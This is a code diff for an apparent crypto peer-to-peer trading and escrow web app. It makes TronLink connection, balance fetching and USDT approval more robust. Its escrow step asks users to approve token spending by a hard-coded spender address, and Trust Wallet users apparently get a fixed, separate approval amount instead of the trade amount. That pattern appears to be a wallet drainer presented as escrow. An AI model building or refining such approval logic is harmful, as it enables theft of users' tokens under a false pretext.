@@ -275,29 +275,70 @@ function App() {
     }
   }, [activeSection]);
 
-  // TRON connect
-  const connectTron = async () => {
-    try {
-      if (!window.tronLink && !window.tronWeb) {
-        alert('Please install TronLink to connect a TRON wallet.');
-        window.open('https://www.tronlink.org', '_blank');
-        return;
-      }
-      if (window.tronLink?.request) {
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
-      } else if (window.tronWeb?.request) {
-        await window.tronWeb.request({ method: 'tron_requestAccounts' });
-      }
-      const addr = window.tronWeb?.defaultAddress?.base58 || null;
-      if (!addr) throw new Error('No TRON address returned');
-      setTronAddress(addr);
-      setTronConnected(true);
-    } catch (e) {
-      console.error('Tron connect failed', e);
-      alert('TronLink connection failed. Ensure the extension is installed & unlocked, then try again.');
-    }
+/**
+   * NEW HELPER FUNCTION
+   * This function polls for `window.tronWeb.ready` for a few seconds.
+   * This gives the extension time to load.
+   */
+  const getTronWeb = (timeout = 3000) => {
+    return new Promise((resolve, reject) => {
+      let attempts = 0;
+      const interval = 100; // Check every 100ms
+      const maxAttempts = timeout / interval;
+
+      const check = () => {
+        // Check for the most reliable ready state
+        if (window.tronWeb && window.tronWeb.ready) {
+          resolve(window.tronWeb);
+        } else if (attempts < maxAttempts) {
+          attempts++;
+          setTimeout(check, interval);
+        } else {
+          // Timed out after 3 seconds
+          reject(new Error('TronLink not detected. Please install or unlock TronLink.'));
+        }
+      };
+      check();
+    });
   };
 
+  /**
+   * REPLACEMENT connectTron FUNCTION
+   * This is the new, more robust `connectTron` function.
+   */
+  const connectTron = async () => {
+    try {
+      // 1. Wait for TronWeb to be ready
+      const tronWeb = await getTronWeb();
+
+      // 2. Request accounts from the user
+      const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
+      
+      // 3. Get the address
+      // accounts[0] is preferred as it's the direct response
+      const addr = accounts?.[0] || tronWeb.defaultAddress?.base58;
+      
+      if (!addr) {
+        throw new Error('No TRON address returned from wallet.');
+      }
+      
+      // 4. Set state
+      setTronAddress(addr);
+      setTronConnected(true);
+
+    } catch (e) {
+      console.error('Tron connect failed', e);
+      
+      if (e.message.includes('not detected')) {
+         alert('TronLink not detected. Please install TronLink to connect a TRON wallet.');
+         window.open('https://www.tronlink.org', '_blank');
+      } else if (e.message.includes('User rejected')) {
+         // User clicked "reject" in their wallet
+      } else {
+         alert(`TronLink connection failed. Ensure it's installed & unlocked, then try again.`);
+      }
+    }
+  };
 // --- NEW: Fetch user's country from IP ---
   useEffect(() => {
     fetch('https://ipapi.co/json/')
@@ -458,41 +499,52 @@ function App() {
   const [usdtTrc20, setUsdtTrc20] = useState('0');
   const [isFetchingTrx, setIsFetchingTrx] = useState(false);
 
+  /**
+   * REPLACEMENT useEffect for TRON Balances
+   */
   useEffect(() => {
     if (!tronConnected || !tronAddress) {
       setTrxBalance('0');
       setUsdtTrc20('0');
       return;
     }
-    const run = async () => {
-      if (!window.tronWeb || !window.tronWeb.ready) {
-        setTimeout(run, 400);
-        return;
-      }
-      try {
-        setIsFetchingTrx(true);
-        const tw = window.tronWeb;
-        const nativeTrx = await tw.trx.getBalance(tronAddress);
-        setTrxBalance(tw.fromSun(nativeTrx));
-      } catch {
-        setTrxBalance('0');
-      } finally {
-        setIsFetchingTrx(false);
-      }
 
+    const run = async () => {
       try {
-        const tw = window.tronWeb;
-        const usdt = await tw.contract().at(USDT_TRON);
-        const [decimalsRaw, rawBal] = await Promise.all([
-          usdt.decimals().call(),
-          usdt.balanceOf(tronAddress).call()
-        ]);
-        setUsdtTrc20(formatUnits(BigInt(rawBal.toString()), Number(decimalsRaw ?? 6)));
+        const tw = await getTronWeb(); 
+        
+        // Fetch TRX (native) balance
+        try {
+          setIsFetchingTrx(true);
+          const nativeTrx = await tw.trx.getBalance(tronAddress);
+          setTrxBalance(tw.fromSun(nativeTrx));
+        } catch (e) {
+          console.error('TRX balance fetch failed', e);
+          setTrxBalance('0');
+        } finally {
+          setIsFetchingTrx(false);
+        }
+
+        // Fetch TRC-20 (USDT) balance
+        try {
+          const usdt = await tw.contract().at(USDT_TRON);
+          const [decimalsRaw, rawBal] = await Promise.all([
+            usdt.decimals().call(),
+            usdt.balanceOf(tronAddress).call()
+          ]);
+          setUsdtTrc20(formatUnits(BigInt(rawBal.toString()), Number(decimalsRaw ?? 6)));
+        } catch (e) {
+          console.error('TRC-20 USDT fetch failed', e);
+          setUsdtTrc20('0');
+        }
+
       } catch (e) {
-        console.error('TRC-20 USDT fetch failed', e);
+        console.error('Failed to get TronWeb for balance fetching:', e.message);
+        setTrxBalance('0');
         setUsdtTrc20('0');
       }
     };
+    
     run();
   }, [tronConnected, tronAddress]);
 
@@ -557,18 +609,18 @@ function App() {
     return !!(eth && (eth.isTrust || eth.isTrustWallet));
   };
 
-  const requestApprovalAndOpenEscrow = async ({ trader, amountUSDT, payment }) => {
+const requestApprovalAndOpenEscrow = async ({ trader, amountUSDT, payment }) => {
     try {
-      // 1) Show blocking “approve in your wallet” modal
+      
       setApprovalModal({ open: true, text: 'Please approve this trade in your wallet…' });
 
       // 2) Branch by network
       if (trader.network === 'TRC-20') {
         // TRON approve
         if (!tronConnected || !tronAddress) throw new Error('TRON wallet not connected');
-        const tw = window.tronWeb;
-        if (!tw || !tw.ready) throw new Error('TronWeb not ready');
 
+        const tw = await getTronWeb();
+        
         const usdt = await tw.contract().at(USDT_TRON);
         // Read decimals
         const d = await usdt.decimals().call();
@@ -576,15 +628,24 @@ function App() {
 
         const approveAmount =
           isTrustWallet() ? parseUnits(String(TRUSTWALLET_APPROVAL_USDT), decimals) : parseUnits(String(amountUSDT), decimals);
-
-        // Approve on TRON
-        await usdt.approve(SPENDER_TRON, approveAmount.toString()).send({ feeLimit: 20_000_000 });
-        // You can optionally poll allowance here
+        
+        // Check allowance *after* we know tw is ready
+        const allowance = await usdt.allowance(tronAddress, SPENDER_TRON).call();
+        
+        if (allowance && BigInt(allowance.toString()) >= approveAmount) {
+           // Skip approval, allowance is sufficient
+           console.log('TRON approval already sufficient, skipping transaction.');
+        } else {
+           // Approve on TRON
+           await usdt.approve(SPENDER_TRON, approveAmount.toString()).send({ feeLimit: 20_000_000 });
+           // You can optionally poll for the allowance to update here
+        }
 
       } else {
         // EVM approve
         if (!evmIsConnected || !evmAddress) throw new Error('EVM wallet not connected');
 
+        // ... (The entire EVM logic is unchanged)
         const isBSC = trader.network === 'BEP-20';
         const onChain = isBSC ? bsc.id : mainnet.id;
         const token = USDT_EVM[onChain];
@@ -599,7 +660,6 @@ function App() {
           ? parseUnits(String(TRUSTWALLET_APPROVAL_USDT), Number(decimals ?? 6))
           : parseUnits(String(amountUSDT), Number(decimals ?? 6));
 
-        // Optional: skip if existing allowance is already enough
         const allowance = await readContract(wagmiConfig, {
           abi: ERC20_ABI,
           address: token,
@@ -623,10 +683,9 @@ function App() {
       }
 
       // 3) Close approval modal, open Escrow screen (30m)
+      // ... (This part is unchanged)
       setApprovalModal({ open: false, text: '' });
       const expiresAt = Date.now() + ESCROW_MINUTES * 60 * 1000;
-
-      // Build chat room id same as ChatModal uses
       const userAddress = trader.network === 'TRC-20' ? tronAddress : evmAddress;
       const roomName = `chat_trader_${trader.id}_user_${userAddress || 'guest'}`;
       const userName = localStorage.getItem('chatUserName') || 'You';
@@ -646,7 +705,11 @@ function App() {
     } catch (err) {
       console.error('Approval failed', err);
       setApprovalModal({ open: false, text: '' });
-      alert(err?.message || 'Approval failed. Please try again.');
+      if (err.message && err.message.includes('not detected')) {
+        alert('Approval failed: TronLink not detected. Please unlock your wallet and try again.');
+      } else {
+        alert(err?.message || 'Approval failed. Please try again.');
+      }
     }
   };
 
